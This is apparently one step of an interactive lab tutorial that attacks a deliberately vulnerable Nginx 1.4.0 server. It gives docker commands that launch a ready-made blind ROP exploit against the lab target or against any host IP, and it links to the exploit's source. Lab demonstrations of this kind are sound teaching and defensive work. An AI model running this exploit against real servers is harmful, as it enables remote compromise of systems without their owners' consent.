Now that Nginx is installed, let's break into it remotely.

`docker run --rm --link target -it polyverse/exp-nginx-1.4.0-brop -p target`{{execute "T3"}}

If you'd rather run the exploit from some other machine outside of this scenario, and have Docker installed on it, you may run this command instead:

`docker run --rm -- -it polyverse/exp-nginx-1.4.0-brop -p [[HOST_IP]]`{{copy}}

The complete source code for the exploit is provided here: https://github.com/polyverse/exp-nginx-1.4.0-brop
